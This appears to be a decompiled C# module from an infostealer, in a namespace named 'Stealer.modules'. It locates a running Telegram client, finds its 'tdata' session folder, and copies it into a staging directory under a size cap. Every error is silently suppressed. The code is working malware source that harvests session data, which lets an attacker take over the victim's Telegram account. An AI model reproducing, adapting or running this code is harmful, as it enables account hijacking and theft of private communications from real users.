using System;
using System.Diagnostics;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x02000035 RID: 53
	public class Telegram
	{
		// Token: 0x0600010F RID: 271 RVA: 0x0000CC60 File Offset: 0x0000AE60
		public static void GetTelegram()
		{
			string path = Program.path;
			try
			{
				string processName = "Telegram";
				Process[] processesByName = Process.GetProcessesByName(processName);
				if (processesByName.Length >= 1)
				{
					string text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
					if (Directory.Exists(text))
					{
						string toDir = path + "\\Telegram";
						Telegram.CopyAll(text, toDir);
						Telegram.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000CCE8 File Offset: 0x0000AEE8
		public static void CopyAll(string fromDir, string toDir)
		{
			try
			{
				Directory.CreateDirectory(toDir);
				foreach (string s in Directory.GetFiles(fromDir))
				{
					if (USB.GetDirSize(toDir, 0L) < 4500000L)
					{
						Telegram.CopyFile(s, toDir);
					}
				}
				foreach (string s2 in Directory.GetDirectories(fromDir))
				{
					if (USB.GetDirSize(toDir, 0L) < 4500000L)
					{
						Telegram.CopyDir(s2, toDir);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000CD7C File Offset: 0x0000AF7C
		private static void CopyFile(string s1, string toDir)
		{
			try
			{
				string fileName = Path.GetFileName(s1);
				if (!Telegram.in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
				{
					string destFileName = toDir + "\\" + fileName;
					File.Copy(s1, destFileName);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000CDE4 File Offset: 0x0000AFE4
		private static void CopyDir(string s, string toDir)
		{
			try
			{
				Telegram.in_patch = true;
				Telegram.CopyAll(s, toDir + "\\" + Path.GetFileName(s));
				Telegram.in_patch = false;
			}
			catch
			{
			}
		}

		// Token: 0x04000084 RID: 132
		public static int count;

		// Token: 0x04000085 RID: 133
		private static bool in_patch;
	}
}
